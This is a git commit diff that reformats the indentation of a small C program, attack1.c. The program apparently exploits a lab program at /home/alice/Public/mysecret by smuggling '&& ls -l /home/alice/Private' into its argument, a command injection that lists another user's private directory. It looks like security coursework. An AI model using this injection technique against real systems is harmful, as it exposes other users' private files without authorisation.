9120f6af74539b23055ca441e4665cae73c6ae2f
Blake Gong <blakegong@Blakes-MacBook-Pro.local>
2015-11-01 02:10:37 +0800

    attack1.c formatted

--- attack1.c
+++ attack1.c
@@ -5,29 +5,29 @@
 
 int main(int argc, char *argv[])
 {
-	FILE *fp;
-	char command[CACHE_MAX], result[CACHE_MAX];
+    FILE *fp;
+    char command[CACHE_MAX], result[CACHE_MAX];
 
-	// strcpy(command, "ls -l ~");
-	strcpy(command, "/home/alice/Public/mysecret \"&& ls -l /home/alice/Private\"");
+    // strcpy(command, "ls -l ~");
+    strcpy(command, "/home/alice/Public/mysecret \"&& ls -l /home/alice/Private\"");
 
-	fp = popen(command, "r");
-	if (fp == NULL)
-		printf("ERROR");
+    fp = popen(command, "r");
+    if (fp == NULL)
+        printf("ERROR");
 
-	int count = 0;
-	while (fgets(result, CACHE_MAX, fp) != NULL) {
-		int i = 0;
-		while (i < CACHE_MAX && result[i] != '\0') {
-			if (count == 2)
-				printf("%c", result[i]);
-			else if (result[i] == '\n')
-				count++;
-			i++;
-		}
-	}
+    int count = 0;
+    while (fgets(result, CACHE_MAX, fp) != NULL) {
+        int i = 0;
+        while (i < CACHE_MAX && result[i] != '\0') {
+            if (count == 2)
+                printf("%c", result[i]);
+            else if (result[i] == '\n')
+                count++;
+            i++;
+        }
+    }
 
-	pclose(fp);
+    pclose(fp);
 
-	return 0;
+    return 0;
 }
